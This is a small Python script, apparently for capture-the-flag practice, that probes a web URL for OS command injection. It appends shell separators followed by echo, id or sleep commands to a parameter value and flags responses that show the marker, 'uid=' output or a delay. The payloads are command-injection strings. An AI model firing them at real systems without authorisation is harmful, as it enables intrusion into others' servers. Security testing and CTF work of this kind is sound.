#!/usr/bin/env python3
"""Probe command injection separators safely.

The URL must contain INJECT. Payloads use echo/id/sleep only by default.
"""

import argparse
import time
import requests


PAYLOADS = [
    "127.0.0.1;echo CTFPROBE",
    "127.0.0.1|echo CTFPROBE",
    "127.0.0.1&&echo CTFPROBE",
    "127.0.0.1%0aecho CTFPROBE",
    "127.0.0.1;id",
    "127.0.0.1;sleep 2",
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="URL containing INJECT")
    ap.add_argument("--cookie", action="append", default=[])
    args = ap.parse_args()
    cookie = dict(x.split("=", 1) for x in args.cookie)
    for payload in PAYLOADS:
        target = args.url.replace("INJECT", requests.utils.quote(payload, safe="%"))
        start = time.time()
        try:
            r = requests.get(target, cookies=cookie, timeout=8)
            elapsed = time.time() - start
            sig = "CTFPROBE" in r.text or "uid=" in r.text or elapsed > 1.8
            print(f"{payload}\tstatus={r.status_code}\tlen={len(r.text)}\ttime={elapsed:.2f}\tsignal={sig}")
            if sig:
                print(r.text[:400])
        except requests.RequestException as e:
            print(f"{payload}\tERROR\t{e}")


if __name__ == "__main__":
    main()

